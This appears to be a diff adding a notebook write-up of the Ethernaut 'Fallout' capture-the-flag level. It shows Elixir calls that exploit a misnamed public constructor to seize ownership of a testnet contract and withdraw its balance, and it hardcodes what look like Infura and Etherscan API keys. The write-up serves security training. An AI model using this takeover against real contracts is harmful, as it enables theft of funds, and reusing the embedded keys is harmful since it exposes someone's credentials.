@@ -1,0 +1,45 @@
+# 2. Fallout
+
+```elixir
+EthClient.Context.set_rpc_host("https://rinkeby.infura.io/v3/70f9cf3592604f94a52a1922c2f081bb")
+EthClient.Context.set_chain_id(4)
+EthClient.Context.set_etherscan_api_key("2AJV1NZUNJFA92GV81D8CRNAV3NMJV6IS5")
+```
+
+## Section
+
+The goal in [this challenge](https://ethernaut.openzeppelin.com/level/0x5732B2F88cbd19B6f01E3a96e9f0D90B917281E5) is to change the ownership of the contract to yourself, and withdraw the contract balance.
+
+Reading the contract, we can see that the developer left the constructor function as public, so we will be exploiting that.
+
+```
+  /* constructor */
+  function Fal1out() public payable {
+    owner = msg.sender;
+    allocations[owner] = msg.value;
+  }
+
+```
+
+<!-- livebook:{"break_markdown":true} -->
+
+First, we set our contract address.
+
+```elixir
+instance_address = "0x6907650AF292E946bf285F4268bFB8A67Eb96700"
+EthClient.Context.set_contract_address(instance_address)
+```
+
+Then, we need to call the public function `Fal1out()` to change the ownership.
+
+```elixir
+EthClient.invoke("Fal1out()", [], %{amount: 0.00001, gas_limit: 150_000})
+```
+
+Then, we can collect the balance of the contract.
+
+```elixir
+EthClient.invoke("collectAllocations()", [], %{amount: 0.0001, gas_limit: 150_000})
+```
+
+GG
